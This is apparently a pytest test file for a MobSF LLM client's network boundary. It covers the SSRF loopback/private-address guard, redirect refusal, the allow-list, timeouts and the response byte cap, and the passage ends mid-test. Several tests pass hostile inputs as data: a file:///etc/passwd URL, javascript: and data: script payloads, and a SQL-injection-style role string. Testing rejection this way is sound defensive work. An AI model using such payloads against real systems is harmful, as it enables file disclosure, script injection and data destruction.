# -*- coding: utf_8 -*-
"""Coverage tests for mobsf/StaticAnalyzer/views/common/llm/client.py.

`GraniteClient` is the ONLY code path that ever makes a network call to a
local LLM host, and it sits on a security boundary: an operator-controlled
URL that must be pinned to loopback/RFC1918 (SSRF guard), must never follow
redirects, must respect an optional allow-list, must time out, must cap the
response body, and must NEVER raise — every failure mode collapses to
``None`` so a misbehaving/absent model can never affect a scan.

These tests exercise the real functions with every *external* boundary
mocked:

  * ``requests.post`` is replaced with an in-process fake that records the
    call and returns a canned, streamable fake ``Response`` — no socket is
    ever opened.
  * DNS resolution for ``_host_is_enclave`` is exercised for real for IP
    literals (``socket.getaddrinfo`` on a numeric address never touches the
    network — the OS resolver short-circuits it), and monkeypatched for the
    branches that need a specific, deterministic ``getaddrinfo`` shape
    (link-local, mixed results, resolver failure).
  * ``ModelIntegration`` DB precedence is exercised against the real ORM
    (``@pytest.mark.django_db``) since that IS the boundary under test for
    ``_resolve_target``.

Style follows ``mobsf/StaticAnalyzer/views/common/llm/test_cov_signals.py``
(same directory) and ``mobsf/RBAC/tests/test_permissions.py`` /
``test_api_key.py`` for DB-touching fixtures.
"""
import ipaddress
import json
import socket

import pytest

from django.test import override_settings

from mobsf.RBAC.models import ModelIntegration
from mobsf.StaticAnalyzer.views.common.llm import client as client_mod
from mobsf.StaticAnalyzer.views.common.llm.client import (
    GraniteClient,
    _host_is_enclave,
    parse_ai_endpoint,
)

LOOPBACK_URL = 'http://127.0.0.1:11434'


# ─────────────────────────────────────────────────────── fakes / helpers
class _FakeResponse:
    """Minimal stand-in for ``requests.Response`` — streamable + closeable."""

    def __init__(self, status_code=200, chunks=(b'{"response": "ok"}',),
                 close_raises=False, iter_raises_after=None):
        self.status_code = status_code
        self._chunks = list(chunks)
        self._iter_raises_after = iter_raises_after
        self.closed = False
        self._close_raises = close_raises

    def iter_content(self, chunk_size=8192):
        for i, chunk in enumerate(self._chunks):
            yield chunk
            if self._iter_raises_after is not None and i == self._iter_raises_after:
                raise ConnectionResetError('simulated stream break')

    def close(self):
        self.closed = True
        if self._close_raises:
            raise RuntimeError('close() blew up')


class _FakePost:
    """Records every call made to ``requests.post``; returns a canned
    response or raises a canned exception. Never touches a real socket."""

    def __init__(self, response=None, raises=None):
        self.response = response
        self.raises = raises
        self.calls = []

    def __call__(self, url, **kwargs):
        self.calls.append({'url': url, **kwargs})
        if self.raises is not None:
            raise self.raises
        return self.response


def _json_chunks(obj, split=1):
    """Encode ``obj`` as JSON bytes, optionally split into N chunks."""
    raw = json.dumps(obj).encode('utf-8')
    if split <= 1:
        return (raw,)
    size = max(1, len(raw) // split)
    return tuple(raw[i:i + size] for i in range(0, len(raw), size))


def _addrinfo_for(*ips, family=socket.AF_INET):
    """Build a fake ``socket.getaddrinfo`` return shaped by IP strings.

    Only ``info[4][0]`` is read by ``_host_is_enclave``, so a 2-tuple
    sockaddr is sufficient even when faking IPv6-looking strings.
    """
    return [(family, socket.SOCK_STREAM, 6, '', (ip, 0)) for ip in ips]


@pytest.fixture
def ai_settings(settings):
    """Baseline AI settings: enabled, loopback endpoint, no allow-list.

    Individual tests override specific attributes on top of this via the
    same ``settings`` fixture (pytest-django restores everything after
    the test regardless of how many attributes were mutated).
    """
    settings.MOBINSPECT_AI_ENABLED = True
    settings.MOBINSPECT_AI_BASE_URL = LOOPBACK_URL
    settings.MOBINSPECT_AI_MODEL_GENERATE = 'granite4:3b'
    settings.MOBINSPECT_AI_MODEL_CLASSIFY = 'granite4:1b'
    settings.MOBINSPECT_AI_ALLOWED_HOSTS = []
    settings.MOBINSPECT_AI_TLS_VERIFY = True
    settings.MOBINSPECT_AI_CA_BUNDLE = ''
    settings.MOBINSPECT_AI_CONNECT_TIMEOUT = 5
    settings.MOBINSPECT_AI_READ_TIMEOUT = 60
    settings.MOBINSPECT_AI_MAX_RESPONSE_BYTES = 2 * 1024 * 1024
    settings.MOBINSPECT_AI_NUM_PREDICT = 768
    settings.MOBINSPECT_AI_NUM_CTX = 8192
    settings.MOBINSPECT_AI_TOP_P = 0.9
    settings.MOBINSPECT_AI_KEEP_ALIVE = '10m'
    return settings


# ═══════════════════════════════════════════════════════ parse_ai_endpoint
def test_parse_valid_http_url():
    parsed = parse_ai_endpoint('http://127.0.0.1:11434')
    assert parsed is not None
    assert parsed.scheme == 'http'
    assert parsed.hostname == '127.0.0.1'
    assert parsed.port == 11434


def test_parse_valid_https_url():
    parsed = parse_ai_endpoint('https://model.internal:8443')
    assert parsed is not None
    assert parsed.scheme == 'https'
    assert parsed.port == 8443


def test_parse_valid_ipv6_url():
    parsed = parse_ai_endpoint('http://[::1]:11434')
    assert parsed is not None
    assert parsed.hostname == '::1'
    assert parsed.port == 11434


def test_parse_strips_surrounding_whitespace():
    parsed = parse_ai_endpoint('  http://127.0.0.1:11434  ')
    assert parsed is not None
    assert parsed.hostname == '127.0.0.1'


def test_parse_none_input_returns_none():
    assert parse_ai_endpoint(None) is None


def test_parse_empty_string_returns_none():
    assert parse_ai_endpoint('') is None


def test_parse_whitespace_only_returns_none():
    assert parse_ai_endpoint('   ') is None


def test_parse_bad_port_out_of_range_returns_none():
    """urlparse().port raises ValueError for ports > 65535 — must be caught."""
    assert parse_ai_endpoint('http://host:99999') is None


def test_parse_bad_port_non_numeric_returns_none():
    """urlparse().port raises ValueError for a non-numeric port string."""
    assert parse_ai_endpoint('http://host:abc') is None


def test_parse_disallowed_scheme_returns_none():
    assert parse_ai_endpoint('ftp://host:21') is None


def test_parse_file_scheme_returns_none():
    assert parse_ai_endpoint('file:///etc/passwd') is None


def test_parse_missing_hostname_returns_none():
    assert parse_ai_endpoint('http://:8080/') is None


def test_parse_zero_port_returns_none():
    """Port 0 is falsy -> treated the same as "no port"."""
    assert parse_ai_endpoint('http://host:0/') is None


def test_parse_missing_port_returns_none():
    assert parse_ai_endpoint('http://host') is None


def test_parse_non_string_input_hits_generic_except():
    """``(url or '').strip()`` raises AttributeError for a non-str truthy
    value (e.g. int) — must be swallowed by the bare `except Exception`."""
    assert parse_ai_endpoint(12345) is None


def test_parse_non_string_falsy_input_returns_none():
    assert parse_ai_endpoint(0) is None
    assert parse_ai_endpoint([]) is None


def test_parse_javascript_scheme_injection_rejected():
    """Adversarial: a javascript:/data: payload never has an allowed scheme."""
    assert parse_ai_endpoint('javascript:alert(1)') is None
    assert parse_ai_endpoint('data:text/html,<script>1</script>') is None


# ═══════════════════════════════════════════════════════ _host_is_enclave
def test_enclave_loopback_ipv4_true():
    assert _host_is_enclave('127.0.0.1') is True


def test_enclave_loopback_ipv6_true():
    assert _host_is_enclave('::1') is True


def test_enclave_rfc1918_10_true():
    assert _host_is_enclave('10.1.2.3') is True


def test_enclave_rfc1918_192_168_true():
    assert _host_is_enclave('192.168.1.50') is True


def test_enclave_rfc1918_172_16_true():
    assert _host_is_enclave('172.20.5.5') is True


def test_enclave_public_ip_false():
    """SSRF guard: a public, non-enclave IP must never pass."""
    assert _host_is_enclave('8.8.8.8') is False


def test_enclave_public_ip_false_cloudflare():
    assert _host_is_enclave('1.1.1.1') is False


def test_enclave_link_local_false(monkeypatch):
    monkeypatch.setattr(
        client_mod.socket, 'getaddrinfo',
        lambda host, port: _addrinfo_for('169.254.1.1'))
    assert _host_is_enclave('link-local-host') is False


def test_enclave_mixed_private_and_public_false(monkeypatch):
    """Any non-loopback/private address in the result set fails the host."""
    monkeypatch.setattr(
        client_mod.socket, 'getaddrinfo',
        lambda host, port: _addrinfo_for('10.0.0.5', '8.8.8.8'))
    assert _host_is_enclave('dns-rebinding-host') is False


def test_enclave_all_private_multi_result_true(monkeypatch):
    monkeypatch.setattr(
        client_mod.socket, 'getaddrinfo',
        lambda host, port: _addrinfo_for('10.0.0.5', '10.0.0.6'))
    assert _host_is_enclave('multi-a-record-host') is True


def test_enclave_getaddrinfo_raises_false(monkeypatch):
    def _boom(host, port):
        raise socket.gaierror('name resolution failed')
    monkeypatch.setattr(client_mod.socket, 'getaddrinfo', _boom)
    assert _host_is_enclave('does-not-resolve.invalid') is False


def test_enclave_empty_addrinfo_false(monkeypatch):
    monkeypatch.setattr(
        client_mod.socket, 'getaddrinfo', lambda host, port: [])
    assert _host_is_enclave('weird-host') is False


def test_enclave_unparseable_ip_string_false(monkeypatch):
    """A getaddrinfo result whose address string isn't a valid IP (should
    not normally happen, but the code guards ip_address(ValueError))."""
    monkeypatch.setattr(
        client_mod.socket, 'getaddrinfo',
        lambda host, port: _addrinfo_for('not-an-ip'))
    assert _host_is_enclave('weird-host') is False


def test_enclave_scoped_ipv6_zone_id_stripped(monkeypatch):
    """A scoped-literal IPv6 address (``%zone``) must have the zone
    stripped before ``ipaddress.ip_address()`` parses it, and a
    link-local scoped address must still be rejected."""
    monkeypatch.setattr(
        client_mod.socket, 'getaddrinfo',
        lambda host, port: _addrinfo_for('fe80::1%en0', family=socket.AF_INET6))
    assert _host_is_enclave('scoped-link-local') is False


def test_enclave_loopback_ipv6_scoped_true(monkeypatch):
    monkeypatch.setattr(
        client_mod.socket, 'getaddrinfo',
        lambda host, port: _addrinfo_for('::1%lo0', family=socket.AF_INET6))
    assert _host_is_enclave('scoped-loopback') is True


def test_enclave_sanity_ipaddress_module_agrees():
    """Cross-check our fixture semantics against stdlib ipaddress directly."""
    assert ipaddress.ip_address('10.0.0.1').is_private
    assert not ipaddress.ip_address('8.8.8.8').is_private
    assert ipaddress.ip_address('169.254.1.1').is_link_local


# ═══════════════════════════════════════════════════════ _resolve_target (DB precedence)
@pytest.mark.django_db
def test_resolve_target_no_db_rows_falls_back_to_settings():
    with override_settings(
            MOBINSPECT_AI_BASE_URL='http://127.0.0.1:11434/',
            MOBINSPECT_AI_MODEL_GENERATE='settings-gen-model'):
        base_url, model = GraniteClient._resolve_target('generate')
    # trailing slash is stripped
    assert base_url == 'http://127.0.0.1:11434'
    assert model == 'settings-gen-model'


@pytest.mark.django_db
def test_resolve_target_db_row_wins_for_generate_role():
    ModelIntegration.objects.create(
        label='gen', role=ModelIntegration.ROLE_GENERATE,
        base_url='http://10.0.0.9:11434', model_name='db-gen-model',
        is_active=True,
    )
    with override_settings(MOBINSPECT_AI_BASE_URL='http://127.0.0.1:11434'):
        base_url, model = GraniteClient._resolve_target('generate')
    assert base_url == 'http://10.0.0.9:11434'
    assert model == 'db-gen-model'


@pytest.mark.django_db
def test_resolve_target_db_row_wins_for_classify_role():
    ModelIntegration.objects.create(
        label='cls', role=ModelIntegration.ROLE_CLASSIFY,
        base_url='http://10.0.0.8:11434', model_name='db-classify-model',
        is_active=True,
    )
    with override_settings(MOBINSPECT_AI_BASE_URL='http://127.0.0.1:11434'):
        base_url, model = GraniteClient._resolve_target('classify')
    assert base_url == 'http://10.0.0.8:11434'
    assert model == 'db-classify-model'


@pytest.mark.django_db
def test_resolve_target_roles_do_not_cross_contaminate():
    """Independent generate/classify rows must each resolve to their own
    endpoint, never the sibling role's."""
    ModelIntegration.objects.create(
        label='gen', role=ModelIntegration.ROLE_GENERATE,
        base_url='http://10.0.0.1:11434', model_name='gen-model',
        is_active=True,
    )
    ModelIntegration.objects.create(
        label='cls', role=ModelIntegration.ROLE_CLASSIFY,
        base_url='http://10.0.0.2:11434', model_name='cls-model',
        is_active=True,
    )
    gen_url, gen_model = GraniteClient._resolve_target('generate')
    cls_url, cls_model = GraniteClient._resolve_target('classify')
    assert (gen_url, gen_model) == ('http://10.0.0.1:11434', 'gen-model')
    assert (cls_url, cls_model) == ('http://10.0.0.2:11434', 'cls-model')


@pytest.mark.django_db
def test_resolve_target_inactive_row_is_ignored():
    ModelIntegration.objects.create(
        label='gen-inactive', role=ModelIntegration.ROLE_GENERATE,
        base_url='http://10.0.0.9:11434', model_name='db-gen-model',
        is_active=False,
    )
    with override_settings(
            MOBINSPECT_AI_BASE_URL='http://127.0.0.1:11434',
            MOBINSPECT_AI_MODEL_GENERATE='settings-gen-model'):
        base_url, model = GraniteClient._resolve_target('generate')
    assert base_url == 'http://127.0.0.1:11434'
    assert model == 'settings-gen-model'


@pytest.mark.django_db
def test_resolve_target_blank_base_url_row_falls_back_to_settings():
    """A DB row exists and is active, but its base_url is whitespace-only —
    ``(row.base_url or '').strip()`` is falsy, so settings still win."""
    ModelIntegration.objects.create(
        label='gen-blank', role=ModelIntegration.ROLE_GENERATE,
        base_url='   ', model_name='db-gen-model', is_active=True,
    )
    with override_settings(
            MOBINSPECT_AI_BASE_URL='http://127.0.0.1:11434',
            MOBINSPECT_AI_MODEL_GENERATE='settings-gen-model'):
        base_url, model = GraniteClient._resolve_target('generate')
    assert base_url == 'http://127.0.0.1:11434'
    assert model == 'settings-gen-model'


@pytest.mark.django_db
def test_resolve_target_apps_get_model_exception_falls_back_to_settings(monkeypatch):
    """If the ORM/apps lookup itself explodes (e.g. app registry not ready),
    the bare except swallows it and settings win — never raises."""
    import django.apps

    def _boom(*args, **kwargs):
        raise LookupError("app 'rbac' doesn't have a model 'ModelIntegration'")
    monkeypatch.setattr(django.apps.apps, 'get_model', _boom)
    with override_settings(
            MOBINSPECT_AI_BASE_URL='http://127.0.0.1:11434',
            MOBINSPECT_AI_MODEL_GENERATE='settings-gen-model'):
        base_url, model = GraniteClient._resolve_target('generate')
    assert base_url == 'http://127.0.0.1:11434'
    assert model == 'settings-gen-model'


@pytest.mark.django_db
def test_resolve_target_classify_default_model_setting_used():
    with override_settings(
            MOBINSPECT_AI_BASE_URL='http://127.0.0.1:11434',
            MOBINSPECT_AI_MODEL_CLASSIFY='settings-classify-model'):
        _base_url, model = GraniteClient._resolve_target('classify')
    assert model == 'settings-classify-model'


# ═══════════════════════════════════════════════════════ GraniteClient.__init__
@pytest.mark.django_db
def test_init_enabled_true_from_settings():
    with override_settings(MOBINSPECT_AI_ENABLED=True):
        client = GraniteClient()
    assert client.enabled is True


@pytest.mark.django_db
def test_init_enabled_false_from_settings():
    with override_settings(MOBINSPECT_AI_ENABLED=False):
        client = GraniteClient()
    assert client.enabled is False


@pytest.mark.django_db
def test_init_enabled_missing_setting_defaults_false(settings):
    if hasattr(settings, 'MOBINSPECT_AI_ENABLED'):
        delattr(settings, 'MOBINSPECT_AI_ENABLED')
    client = GraniteClient()
    assert client.enabled is False


@pytest.mark.django_db
def test_init_default_role_is_generate():
    client = GraniteClient()
    assert client.role == 'generate'


@pytest.mark.django_db
def test_init_classify_role_is_preserved():
    client = GraniteClient(role='classify')
    assert client.role == 'classify'


@pytest.mark.django_db
def test_init_invalid_role_coerced_to_generate():
    """Adversarial: an unrecognized/injected role string must not be
    trusted — it silently falls back to 'generate' rather than erroring
    or being used verbatim in a DB filter or URL."""
    client = GraniteClient(role="generate'; DROP TABLE--")
    assert client.role == 'generate'


@pytest.mark.django_db
def test_init_none_role_coerced_to_generate():
    client = GraniteClient(role=None)
    assert client.role == 'generate'


# ═══════════════════════════════════════════════════════ _validate_endpoint
@pytest.mark.django_db
def test_validate_endpoint_malformed_base_url_returns_none():
    with override_settings(MOBINSPECT_AI_BASE_URL='not-a-url'):
        client = GraniteClient()
    assert client._validate_endpoint() is None


@pytest.mark.django_db
def test_validate_endpoint_empty_base_url_returns_none():
    with override_settings(MOBINSPECT_AI_BASE_URL=''):
        client = GraniteClient()
    assert client._validate_endpoint() is None


@pytest.mark.django_db
def test_validate_endpoint_loopback_host_accepted():
    with override_settings(MOBINSPECT_AI_BASE_URL=LOOPBACK_URL,
                            MOBINSPECT_AI_ALLOWED_HOSTS=[]):
        client = GraniteClient()
        parsed = client._validate_endpoint()
    assert parsed is not None
    assert parsed.hostname == '127.0.0.1'
    assert parsed.port == 11434


@pytest.mark.django_db
def test_validate_endpoint_private_host_accepted():
    with override_settings(MOBINSPECT_AI_BASE_URL='http://10.0.0.5:11434',
                            MOBINSPECT_AI_ALLOWED_HOSTS=[]):
        client = GraniteClient()
        parsed = client._validate_endpoint()
    assert parsed is not None


@pytest.mark.django_db
def test_validate_endpoint_public_host_rejected_ssrf_guard():
    """The core SSRF guard: a public egress target must be refused even
    if it parses fine and is not on any deny-list."""
    with override_settings(MOBINSPECT_AI_BASE_URL='http://8.8.8.8:11434',
                            MOBINSPECT_AI_ALLOWED_HOSTS=[]):
        client = GraniteClient()
        parsed = client._validate_endpoint()
    assert parsed is None


@pytest.mark.django_db
def test_validate_endpoint_allowed_hosts_rejects_unlisted_host():
    with override_settings(
            MOBINSPECT_AI_BASE_URL=LOOPBACK_URL,
            MOBINSPECT_AI_ALLOWED_HOSTS=['someother.host:9999']):
        client = GraniteClient()
        parsed = client._validate_endpoint()
    assert parsed is None


@pytest.mark.django_db
def test_validate_endpoint_allowed_hosts_accepts_listed_host():
    with override_settings(
            MOBINSPECT_AI_BASE_URL=LOOPBACK_URL,
            MOBINSPECT_AI_ALLOWED_HOSTS=['127.0.0.1:11434']):
        client = GraniteClient()
        parsed = client._validate_endpoint()
    assert parsed is not None


@pytest.mark.django_db
def test_validate_endpoint_allowed_hosts_still_enforces_enclave_check():
    """Being on the allow-list is necessary but not sufficient — a public
    host listed by mistake must still fail the enclave/SSRF check."""
    with override_settings(
            MOBINSPECT_AI_BASE_URL='http://8.8.8.8:11434',
            MOBINSPECT_AI_ALLOWED_HOSTS=['8.8.8.8:11434']):
        client = GraniteClient()
        parsed = client._validate_endpoint()
    assert parsed is None


# ═══════════════════════════════════════════════════════ generate() — guard branches
@pytest.mark.django_db
def test_generate_disabled_returns_none_without_network_call(monkeypatch, ai_settings):
    ai_settings.MOBINSPECT_AI_ENABLED = False
    fake_post = _FakePost(response=_FakeResponse())
    monkeypatch.setattr(client_mod.requests, 'post', fake_post)
    client = GraniteClient()
    result = client.generate('sys', 'prompt')
    assert result is None
    assert fake_post.calls == []


@pytest.mark.django_db
def test_generate_invalid_endpoint_returns_none_without_network_call(
        monkeypatch, ai_settings):
    ai_settings.MOBINSPECT_AI_BASE_URL = 'not-a-url'
    fake_post = _FakePost(response=_FakeResponse())
    monkeypatch.setattr(client_mod.requests, 'post', fake_post)
    client = GraniteClient()
    result = client.generate('sys', 'prompt')
    assert result is None
    assert fake_post.calls == []


@pytest.mark.django_db
def test_generate_ssrf_rejected_endpoint_returns_none_without_network_call(
        monkeypatch, ai_settings):
    ai_settings.MOBINSPECT_AI_BASE_URL = 'http://8.8.8.8:11434'
    fake_post = _FakePost(response=_FakeResponse())
    monkeypatch.setattr(client_mod.requests, 'post', fake_post)
    client = GraniteClient()
    result = client.generate('sys', 'prompt')
    assert result is None
    assert fake_post.calls == []


# ═══════════════════════════════════════════════════════ generate() — success + payload shape
@pytest.mark.django_db
def test_generate_success_returns_text(monkeypatch, ai_settings):
    fake_post = _FakePost(response=_FakeResponse(
        chunks=_json_chunks({'response': 'Hello, world.'})))
    monkeypatch.setattr(client_mod.requests, 'post', fake_post)
    client = GraniteClient()
    result = client.generate('you are an assistant', 'summarize this apk')
    assert result == 'Hello, world.'
    assert len(fake_post.calls) == 1


@pytest.mark.django_db
def test_generate_posts_to_api_generate_endpoint(monkeypatch, ai_settings):
    fake_post = _FakePost(response=_FakeResponse())
    monkeypatch.setattr(client_mod.requests, 'post', fake_post)
    client = GraniteClient()
    client.generate('sys', 'prompt')
    assert fake_post.calls[0]['url'] == f'{LOOPBACK_URL}/api/generate'


@pytest.mark.django_db
def test_generate_uses_resolved_model_when_none_passed(monkeypatch, ai_settings):
    fake_post = _FakePost(response=_FakeResponse())
    monkeypatch.setattr(client_mod.requests, 'post', fake_post)
    client = GraniteClient()
    client.generate('sys', 'prompt')
    assert fake_post.calls[0]['json']['model'] == 'granite4:3b'


@pytest.mark.django_db
def test_generate_explicit_model_overrides_resolved_model(monkeypatch, ai_settings):
    fake_post = _FakePost(response=_FakeResponse())
    monkeypatch.setattr(client_mod.requests, 'post', fake_post)
    client = GraniteClient()
    client.generate('sys', 'prompt', model='custom-model:latest')
    assert fake_post.calls[0]['json']['model'] == 'custom-model:latest'


@pytest.mark.django_db
def test_generate_explicit_num_predict_overrides_settings(monkeypatch, ai_settings):
    fake_post = _FakePost(response=_FakeResponse())
    monkeypatch.setattr(client_mod.requests, 'post', fake_post)
    client = GraniteClient()
    client.generate('sys', 'prompt', num_predict=42)
    assert fake_post.calls[0]['json']['options']['num_predict'] == 42


@pytest.mark.django_db
def test_generate_num_predict_zero_falls_back_to_settings_default(
        monkeypatch, ai_settings):
    """Documents a real quirk: ``num_predict=0`` is falsy in Python, so
    ``num_predict or getattr(settings, ...)`` silently substitutes the
    settings default instead of honoring an explicit 0."""
    ai_settings.MOBINSPECT_AI_NUM_PREDICT = 768
    fake_post = _FakePost(response=_FakeResponse())
    monkeypatch.setattr(client_mod.requests, 'post', fake_post)
    client = GraniteClient()
    client.generate('sys', 'prompt', num_predict=0)
    assert fake_post.calls[0]['json']['options']['num_predict'] == 768


@pytest.mark.django_db
def test_generate_payload_options_reflect_settings(monkeypatch, ai_settings):
    ai_settings.MOBINSPECT_AI_NUM_CTX = 4096
    ai_settings.MOBINSPECT_AI_TOP_P = 0.5
    ai_settings.MOBINSPECT_AI_KEEP_ALIVE = '5m'
    fake_post = _FakePost(response=_FakeResponse())
    monkeypatch.setattr(client_mod.requests, 'post', fake_post)
    client = GraniteClient()
    client.generate('sys', 'prompt')
    payload = fake_post.calls[0]['json']
    assert payload['options']['num_ctx'] == 4096
    assert payload['options']['top_p'] == 0.5
    assert payload['options']['temperature'] == 0.2  # fixed, not configurable
    assert payload['keep_alive'] == '5m'
    assert payload['stream'] is False


@pytest.mark.django_db
def test_generate_options_cast_string_settings_to_numeric(monkeypatch, ai_settings):
    """Settings values arriving as strings (e.g. raw env vars in a
    misconfigured deployment) must still be cast, not passed through raw."""
    ai_settings.MOBINSPECT_AI_NUM_CTX = '2048'
    ai_settings.MOBINSPECT_AI_TOP_P = '0.75'
    fake_post = _FakePost(response=_FakeResponse())
    monkeypatch.setattr(client_mod.requests, 'post', fake_post)
    client = GraniteClient()
    client.generate('sys', 'prompt')
    payload = fake_post.calls[0]['json']
    assert payload['options']['num_ctx'] == 2048
    assert isinstance(payload['options']['num_ctx'], int)
    assert payload['options']['top_p'] == 0.75
    assert isinstance(payload['options']['top_p'], float)


@pytest.mark.django_db
def test_generate_request_uses_allow_redirects_false(monkeypatch, ai_settings):
    fake_post = _FakePost(response=_FakeResponse())
    monkeypatch.setattr(client_mod.requests, 'post', fake_post)
    client = GraniteClient()
    client.generate('sys', 'prompt')
    assert fake_post.calls[0]['allow_redirects'] is False


@pytest.mark.django_db
def test_generate_request_uses_stream_true(monkeypatch, ai_settings):
    fake_post = _FakePost(response=_FakeResponse())
    monkeypatch.setattr(client_mod.requests, 'post', fake_post)
    client = GraniteClient()
    client.generate('sys', 'prompt')
    assert fake_post.calls[0]['stream'] is True


@pytest.mark.django_db
def test_generate_request_timeout_is_connect_read_tuple(monkeypatch, ai_settings):
    ai_settings.MOBINSPECT_AI_CONNECT_TIMEOUT = 3
    ai_settings.MOBINSPECT_AI_READ_TIMEOUT = 45
    fake_post = _FakePost(response=_FakeResponse())
    monkeypatch.setattr(client_mod.requests, 'post', fake_post)
    client = GraniteClient()
    client.generate('sys', 'prompt')
    assert fake_post.calls[0]['timeout'] == (3, 45)


@pytest.mark.django_db
def test_generate_verify_true_without_ca_bundle_stays_true(monkeypatch, ai_settings):
    ai_settings.MOBINSPECT_AI_TLS_VERIFY = True
    ai_settings.MOBINSPECT_AI_CA_BUNDLE = ''
    fake_post = _FakePost(response=_FakeResponse())
    monkeypatch.setattr(client_mod.requests, 'post', fake_post)
    client = GraniteClient()
    client.generate('sys', 'prompt')
    assert fake_post.calls[0]['verify'] is True


@pytest.mark.django_db
def test_generate_verify_true_with_ca_bundle_uses_bundle_path(monkeypatch, ai_settings):
    ai_settings.MOBINSPECT_AI_TLS_VERIFY = True
    ai_settings.MOBINSPECT_AI_CA_BUNDLE = '/etc/ssl/certs/internal-ca.pem'
    fake_post = _FakePost(response=_FakeResponse())
    monkeypatch.setattr(client_mod.requests, 'post', fake_post)
    client = GraniteClient()
    client.generate('sys', 'prompt')
    assert fake_post.calls[0]['verify'] == '/etc/ssl/certs/internal-ca.pem'


@pytest.mark.django_db
def test_generate_verify_false_ignores_ca_bundle(monkeypatch, ai_settings):
    ai_settings.MOBINSPECT_AI_TLS_VERIFY = False
    ai_settings.MOBINSPECT_AI_CA_BUNDLE = '/etc/ssl/certs/internal-ca.pem'
    fake_post = _FakePost(response=_FakeResponse())
    monkeypatch.setattr(client_mod.requests, 'post', fake_post)
    client = GraniteClient()
    client.generate('sys', 'prompt')
    assert fake_post.calls[0]['verify'] is False


@pytest.mark.django_db
def test_generate_response_closed_on_success(monkeypatch, ai_settings):
    resp = _FakeResponse()
    fake_post = _FakePost(response=resp)
    monkeypatch.setattr(client_mod.requests, 'post', fake_post)
    client = GraniteClient()
    client.generate('sys', 'prompt')
    assert resp.closed is True


# ═══════════════════════════════════════════════════════ generate() — HTTP failure branches
@pytest.mark.django_db
@pytest.mark.parametrize('status', [301, 302, 303, 307, 308])
def test_generate_redirect_status_codes_rejected(monkeypatch, ai_settings, status):
    fake_post = _FakePost(response=_FakeResponse(status_code=status))
    monkeypatch.setattr(client_mod.requests, 'post', fake_post)
    client = GraniteClient()
    assert client.generate('sys', 'prompt') is None


@pytest.mark.django_db
@pytest.mark.parametrize('status', [400, 404, 500, 502, 503])
def test_generate_non_200_status_returns_none(monkeypatch, ai_settings, status):
    fake_post = _FakePost(response=_FakeResponse(status_code=status))
    monkeypatch.setattr(client_mod.requests, 'post', fake_post)
    client = GraniteClient()
    assert client.generate('sys', 'prompt') is None


@pytest.mark.django_db
def test_generate_redirect_response_still_closed(monkeypatch, ai_settings):
    resp = _FakeResponse(status_code=302)
    fake_post = _FakePost(response=resp)
    monkeypatch.setattr(client_mod.requests, 'post', fake_post)
    client = GraniteClient()
    client.generate('sys', 'prompt')
    assert resp.closed is True


# ═══════════════════════════════════════════════════════ generate() — streaming byte cap
@pytest.mark.django_db
def test_generate_streamed_response_exceeding_cap_returns_none(monkeypatch, ai_settings):
    ai_settings.MOBINSPECT_AI_MAX_RESPONSE_BYTES = 8
    body = json.dumps({'response': 'this response is way longer than 8 bytes'})
    fake_post = _FakePost(response=_FakeResponse(chunks=(body.encode('utf-8'),)))
    monkeypatch.setattr(client_mod.requests, 'post', fake_post)
    client = GraniteClient()
    assert client.generate('sys', 'prompt') is None


@pytest.mark.django_db
def test_generate_streamed_response_at_exact_cap_boundary_succeeds(
        monkeypatch, ai_settings):
    body = json.dumps({'response': 'ok'}).encode('utf-8')
    ai_settings.MOBINSPECT_AI_MAX_RESPONSE_BYTES = len(body)
    fake_post = _FakePost(response=_FakeResponse(chunks=(body,)))
    monkeypatch.setattr(client_mod.requests, 'post', fake_post)
    client = GraniteClient()
    assert client.generate('sys', 'prompt') == 'ok'


@pytest.mark.django_db
def test_generate_streamed_response_one_byte_over_cap_fails(monkeypatch, ai_settings):
    body = json.dumps({'response': 'ok'}).encode('utf-8')
    ai_settings.MOBINSPECT_AI_MAX_RESPONSE_BYTES = len(body) - 1
    fake_post = _FakePost(response=_FakeResponse(chunks=(body,)))
    monkeypatch.setattr(client_mod.requests, 'post', fake_post)
    client = GraniteClient()
    assert client.generate('sys', 'prompt') is None


@pytest.mark.django_db
def test_generate_multi_chunk_stream_reassembled_correctly(monkeypatch, ai_settings):
    """Multiple small chunks accumulate via ``bytearray.extend`` before the
    final ``json.loads`` — verify the reassembly, not just single-chunk."""
    fake_post = _FakePost(response=_FakeResponse(
        chunks=_json_chunks({'response': 'assembled from many chunks'}, split=5)))
    monkeypatch.setattr(client_mod.requests, 'post', fake_post)
    client = GraniteClient()
    assert client.generate('sys', 'prompt') == 'assembled from many chunks'


@pytest.mark.django_db
def test_generate_empty_chunks_are_skipped(monkeypatch, ai_settings):
    """``if chunk:`` guards against keep-alive empty chunks in the stream."""
    chunks = (b'', b'{"resp', b'', b'onse": "still works"}', b'')
    fake_post = _FakePost(response=_FakeResponse(chunks=chunks))
    monkeypatch.setattr(client_mod.requests, 'post', fake_post)
    client = GraniteClient()
    assert client.generate('sys', 'prompt') == 'still works'


# ═══════════════════════════════════════════════════════ generate() — malformed/adversarial response bodies
@pytest.mark.django_db
def test_generate_invalid_json_body_returns_none(monkeypatch, ai_settings):
    fake_post = _FakePost(response=_FakeResponse(chunks=(b'not { valid json',)))
    monkeypatch.setattr(client_mod.requests, 'post', fake_post)
    client = GraniteClient()
    assert client.generate('sys', 'prompt') is None


@pytest.mark.django_db
def test_generate_empty_body_returns_none(monkeypatch, ai_settings):
    fake_post = _FakePost(response=_FakeResponse(chunks=()))
    monkeypatch.setattr(client_mod.requests, 'post', fake_post)
    client = GraniteClient()
    assert client.generate('sys', 'prompt') is None


@pytest.mark.django_db
def test_generate_missing_response_key_returns_none(monkeypatch, ai_settings):
    fake_post = _FakePost(response=_FakeResponse(
        chunks=_json_chunks({'other_field': 'value'})))
    monkeypatch.setattr(client_mod.requests, 'post', fake_post)
    client = GraniteClient()
    assert client.generate('sys', 'prompt') is None


@pytest.mark.django_db
def test_generate_non_string_response_value_returns_none(monkeypatch, ai_settings):
    fake_post = _FakePost(response=_FakeResponse(
        chunks=_json_chunks({'response': 12345})))
    monkeypatch.setattr(client_mod.requests, 'post', fake_post)
    client = GraniteClient()
    assert client.generate('sys', 'prompt') is None


@pytest.mark.django_db
def test_generate_null_response_value_returns_none(monkeypatch, ai_settings):
    fake_post = _FakePost(response=_FakeResponse(
        chunks=_json_chunks({'response': None})))
    monkeypatch.setattr(client_mod.requests, 'post', fake_post)
    client = GraniteClient()
    assert client.generate('sys', 'prompt') is None


@pytest.mark.django_db
def test_generate_whitespace_only_response_returns_none(monkeypatch, ai_settings):
    fake_post = _FakePost(response=_FakeResponse(
